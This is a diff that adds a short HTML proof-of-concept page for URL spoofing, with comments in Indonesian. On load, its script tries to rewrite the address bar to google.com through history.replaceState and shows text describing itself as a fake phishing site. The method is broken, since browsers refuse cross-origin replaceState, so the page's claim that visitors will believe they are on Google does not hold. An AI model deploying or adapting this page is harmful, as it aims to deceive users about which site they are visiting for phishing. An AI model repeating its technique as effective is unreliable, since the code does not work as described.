@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>URL Spoofing PoC</title>
+    <script>
+        // Fungsi untuk mengubah URL di address bar tanpa mengubah konten
+        function spoofURL() {
+            // Ganti URL di address bar dengan URL yang diinginkan
+            history.replaceState(null, "", "https://google.com");
+
+            // Tampilkan konten yang berbeda
+            document.getElementById("content").innerHTML = `
+                <h1>Welcome to Fake Site</h1>
+                <p>This is a simulated phishing page.</p>
+                <p>You think you're on Google, but you're actually on a fake site.</p>
+            `;
+        }
+
+        // Jalankan fungsi spoofURL saat halaman dimuat
+        window.onload = spoofURL;
+    </script>
+</head>
+<body>
+    <div id="content">
+        <!-- Konten asli akan diganti oleh JavaScript -->
+    </div>
+</body>
+</html>
